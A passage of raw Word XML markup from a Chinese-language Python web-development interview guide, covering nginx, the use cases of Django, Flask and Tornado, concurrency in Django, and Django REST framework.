        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>http</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>协议的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>服务器。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B60972A"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 xml:space="preserve">nginx </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>是一个开源的高性能的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>服务器和反向代理：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6393DB0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作为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>服务器，它处理静态文件和索引文件效果非常高</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A45B0C5"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它的设计非常注重效率，最大支持</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>万个并发连接，但只占用很少的内存空间</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E9B55A0"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稳定性高，配置简洁</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4830AFB8"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强大的反向代理和负载均衡功能，平衡集群中各个服务器的负载压力应用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ED20275"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2.14 Python</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>中三大框架各自的应用场景？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29B5097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django:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>主要是用来搞快速开发的，他的亮点就是快速开发，节约成本，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>如果要实现高并发的话，就要对</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>进行二次开发，比如把整个笨重的框架给拆掉自己写</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>socket</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>实现</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>http</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>的通信</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>底层用纯</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>c,c++</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>写提升效率，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>ORM</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>框架给干掉，自己编写封装与数据库交互的框架</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>ORM</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>虽然面向对象来操作数据库，但是它的效率很低，使用外键来联系表与表之间的查询</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve">; </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2138CE3C"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flask: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>轻量级，主要是用来写接口的一个框架，实现前后端分离，提考开发效率，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Flask</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>本身相当于一个内核，其他几乎所有的功能都要用到扩展</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>邮件扩展</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Flask-Mail</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>，用户认证</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Flask-Login),</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>都需要用第三方的扩展来实现。比如可以用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Flask-extension</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>加入</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>ORM</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>、文件上传、身份验证等。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Flask</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>没有默认使用的数据库，你可以选择</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>MySQL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>，也可以用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>NoSQL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>其</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>工具箱用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Werkzeug(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>路由模块</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>，模板引擎则使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Jinja2,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>这两个也是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Flask</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>框架的核心。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B4C898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Tornado</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> Tornado</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>是一种</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>服务器软件的开源版本。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Tornado</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>和现在的主流</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>服务器框架（包括大多数</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Python</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快。得利于其非阻塞的方式和对</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>epoll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>的运用，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Tornado</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>每秒可以处理数以千计的连接因此</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Tornado</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>是实时</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>服务的一个理想框架</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62449638"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2.17 Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>中哪里用到了线程？哪里用到了协程？哪里用到了进程？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C43D98D" w14:textId="77777777" w:rsidR="00191162" w:rsidRDefault="00191162" w:rsidP="00191162">
      <w:pPr>
        <w:pStyle w:val="a7"/>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1.Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>中耗时的任务用一个进程或者线程来执行，比如发邮件，使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve">celery. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51FDF60D" w14:textId="77777777" w:rsidR="00191162" w:rsidRDefault="00191162" w:rsidP="00191162">
      <w:pPr>
        <w:pStyle w:val="a7"/>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部署</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>项目是时候，配置文件中设置了进程和协程的相关配置。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16D52612"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2.18 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>有用过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Django REST framework</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>吗？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A222FB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Django REST framework</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>是一个强大而灵活的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Web API</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>工具。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C8E767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使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>RESTframework</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>的理由有：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6064C43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Web browsable API</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>对开发者有极大的好处</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>包括</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>OAuth1a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>OAuth2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>的认证策略</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14C98420"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支持</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>ORM</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>和非</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>ORM</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>数据资源的序列化</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11DE6DE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全程自定义开发</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>--</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
